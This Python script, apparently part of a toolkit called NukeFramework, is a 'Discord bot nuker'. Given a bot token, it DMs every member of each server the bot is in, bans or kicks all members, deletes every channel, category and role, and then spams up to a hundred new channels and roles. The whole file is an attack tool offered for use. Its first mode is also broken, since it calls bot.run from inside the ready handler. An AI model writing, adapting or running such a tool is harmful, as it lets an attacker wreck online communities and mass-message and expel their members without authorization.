import os
try:
    import discord
except:
    os.system("pip3 install discord")
import time
import platform
import getpass
import colorama
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
def welcome():
    print("==========================================================")
    print("Welcome to Discordbotnuker (Weaponize a Discord bot token)")
    print("==========================================================")
    print("")
    print("Complete destruction (1), Custommode (2)")

def getlocaluser():
    try:
        global User
        User = getpass.getuser()
    except:
        User = "(Could not get local user)"
    return User
def macexitrun():
    os.chdir("..")
    print("Returning to NukeFramework...")
    time.sleep(1)
    clr()
    os.chdir("/Users/" + getlocaluser() + "/Library/Application Support/NF2/Data")
    with open("runnerlocation.txt", "r") as f:
        runnerlocation = f.read()
    os.system("python3 " + runnerlocation + "/run.py")
    exit()
hostos = platform.system()
if hostos == "Darwin":
    clr()
    repeat = True

    welcome()
    amethod = True
    while amethod == True:
        
        method = input("Enter the method you want to use (type exit if you want to return to nf2): ")
        method = method.strip()
        if method == "exit":
            amethod = False
            macexitrun()
        if method == "1":
            amethod = False
        elif method == "2":
            amethod = False
        else:
            print("Invalid method!")
    if method == "1":
        token = input("Enter the bot token you want to use: ")
        channelname = input("Enter the name of the channels you want to create: ")
        rolename = input("Enter the name of the roles you want to create: ")
        dm = input("Enter the message you want to send to the users: ")
        token = token.strip()
        # intents default
        intents = discord.Intents.default()
        bot = discord.Client(intents=intents)
        @bot.event
        async def on_ready():
            # for every guild the bot is in try to ban all members if permitted
            for guild in bot.guilds:
                # try to dm every user in the guild
                counter = 0
                for member in guild.members:
                    counter = counter + 1
                    try:
                        await member.send(dm)
                        # print success with green color and emoji ( •̀ᴗ•́ )و ̑̑
                        print(colorama.Fore.GREEN + "Successfully sent a dm to " + member.name + "#" + member.discriminator + " ( •̀ᴗ•́ )و ̑̑" + str(counter))

                    except:
                        pass
                counter = 0
                for member in guild.members:
                    counter = counter + 1
                    try:
                        await member.ban()
                        # print that the member was banned in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Banned member " + member.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        
                    except:
                        # print a red message saying that the member could not be banned with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not ban member" + member.name + " (╥﹏╥) " + str(counter))
                # for every channel in the guild try to delete it if permitted
                counter = 0
                for channel in guild.channels:
                    counter = counter + 1
                    try:
                        await channel.delete()
                        # print that the channel was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Deleted channel " + channel.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                    except:
                        # print a red message saying that the channel could not be deleted with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not delete channel " + channel.name + " (╥﹏╥) " + str(counter))
                # delete all categories
                counter = 0
                for category in guild.categories:
                    counter = counter + 1
                    try:
                        await category.delete()
                        # print that the category was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Deleted category " + category.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                    except:
                        # print a red message saying that the category could not be deleted with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not delete category " + category.name + " (╥﹏╥) " + str(counter))
                # for every role in the guild try to delete it if permitted
                counter = 0
                for role in guild.roles:
                    counter = counter + 1
                    try:
                        await role.delete()
                        # print that the role was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Deleted role " + role.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                    except:
                        # print a red message saying that the role could not be deleted with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not delete role " + role.name + " (╥﹏╥) " + str(counter))
                # create 100 channels with the name specified by the user
                counter = 0
                for i in range(100):
                    counter = counter + 1
                    try:
                        await guild.create_text_channel(channelname)
                        # print that the channel was created in green and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Created channel " + channelname + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                    except:
                        # print a red message saying that the channel could not be created with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not create channel " + channelname + " (╥﹏╥) " + str(counter))
                counter = 0
                # create 100 roles with the name specified by the user
                for i in range(100):
                    counter = counter + 1
                    try:
                        await guild.create_role(name=rolename)
                        # print that the role was created in green and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                        print(colorama.Fore.GREEN + "Created role " + rolename + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                    except:
                        # print a red message saying that the role could not be created with a sad  (╥﹏╥) emoji
                        print(colorama.Fore.RED + "Could not create role " + rolename + " (╥﹏╥) " + str(counter))
                
                # exit the program
                bot.run(token)
                bot.logout()
                
                # print a message saying that the program has finished in green and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                print(colorama.Fore.GREEN + "Finished ( •̀ᴗ•́ )و ̑̑")
                repeater = input("Enter to nuke another token, type exit to return to nf2: ")
                # trim
                repeater = repeater.strip()
                if repeater == "exit":
                    repeat = False
                    macexitrun()
                else:
                    repeat = True
                    clr()
    if method == "2":
        token = input("Enter the bot token you want to use: ")
        deletechannels = input("Do you want to delete all channels? (y/n): ")
        deletechannels = deletechannels.strip()
        deletecategories = input("Do you want to delete all categories? (y/n): ")
        deletecategories = deletecategories.strip()
        deleteroles = input("Do you want to delete all roles? (y/n): ")
        deleteroles = deleteroles.strip()
        banmembers = input("Do you want to ban all members? (y/n): ")
        banmembers = banmembers.strip()
        dodm = input("Do you want to dm all members? (y/n): ")
        dodm = dodm.strip()
        if dodm == "y":
            dm = input("Enter the message you want to send to the users: ")
            dm = dm.strip()
        else:
            dm = ""
        # kick all members?
        if banmembers == "n":
            kickmembers = input("Do you want to kick all members? (y/n): ")
            kickmembers = kickmembers.strip()
        # create channels?
        channelcreate = input("Do you want to create channels? (y/n): ")
        channelcreate = channelcreate.strip()
        if channelcreate == "y":
            channelname = input("Enter the name of the channels you want to create: ")
            channelname = channelname.strip()
            channelamount = input("Enter the amount of channels you want to create: ")
            channelamount = channelamount.strip()
        #  create roles?
        rolecreate = input("Do you want to create roles? (y/n): ")
        rolecreate = rolecreate.strip()
        if rolecreate == "y":
            rolename = input("Enter the name of the roles you want to create: ")
            rolename = rolename.strip()
            roleamount = input("Enter the amount of roles you want to create: ")
            roleamount = roleamount.strip()
        token = token.strip()
        # default intents
        intents = discord.Intents.default()
        bot = discord.Client(intents=intents)
        @bot.event
        async def on_ready():
            # get the guild
            guild = bot.guilds[0]
            # delete all channels
            for guild in bot.guilds:
                if deletechannels == "y":
                    counter = 0
                    for channel in guild.text_channels:
                        counter += 1
                        try:
                            await channel.delete()
                            # print that the channel was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama and counter
                            print(colorama.Fore.GREEN + "Deleted channel " + channel.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the channel could not be deleted with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not delete channel " + channel.name + " (╥﹏╥) " + str(counter))
                # delete all categories
                if deletecategories == "y":
                    counter = 0
                    for category in guild.categories:
                        counter += 1
                        try:
                            await category.delete()
                            # print that the category was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Deleted category " + category.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the category could not be deleted with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not delete category " + category.name + " (╥﹏╥) " + str(counter))
                # delete all roles
                if deleteroles == "y":
                    counter = 0
                    for role in guild.roles:
                        counter += 1
                        try:
                            await role.delete()
                            # print that the role was deleted in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Deleted role " + role.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the role could not be deleted with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not delete role " + role.name + " (╥﹏╥) " + str(counter))
                # ban all members
                if banmembers == "y":
                    counter = 0
                    for member in guild.members:
                        counter += 1
                        try:
                            await member.ban()
                            # print that the member was banned in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Banned member " + member.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the member could not be banned with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not ban member " + member.name + " (╥﹏╥) " + str(counter))
                # kick all members
                if kickmembers == "y":
                    counter = 0
                    for member in guild.members:
                        counter += 1
                        try:
                            await member.kick()
                            # print that the member was kicked in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Kicked member " + member.name + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the member could not be kicked with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not kick member " + member.name + " (╥﹏╥) " + str(counter))
                # create channels
                if channelcreate == "y":
                    counter = 0
                    for i in range(int(channelamount)):
                        counter += 1
                        try:
                            await guild.create_text_channel(channelname)
                            # print that the channel was created in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Created channel " + channelname + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the channel could not be created with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not create channel " + channelname + " (╥﹏╥) " + str(counter))
                # create roles
                if rolecreate == "y":
                    counter = 0
                    for i in range(int(roleamount)):
                        counter += 1
                        try:
                            await guild.create_role(name=rolename)
                            # print that the role was created in red and with emoji ( •̀ᴗ•́ )و ̑̑ with colorama
                            print(colorama.Fore.GREEN + "Created role " + rolename + " ( •̀ᴗ•́ )و ̑̑ " + str(counter))
                        except:
                            # print a red message saying that the role could not be created with a sad  (╥﹏╥) emoji
                            print(colorama.Fore.RED + "Could not create role " + rolename + " (╥﹏╥) " + str(counter))
        bot.run(token)
        bot.logout()

        # print done in green and emoji
        print(colorama.Fore.GREEN + "Done ( •̀ᴗ•́ )و ̑̑")
        # wait for user input
        input("Press enter to exit")
        macexitrun()
        
            

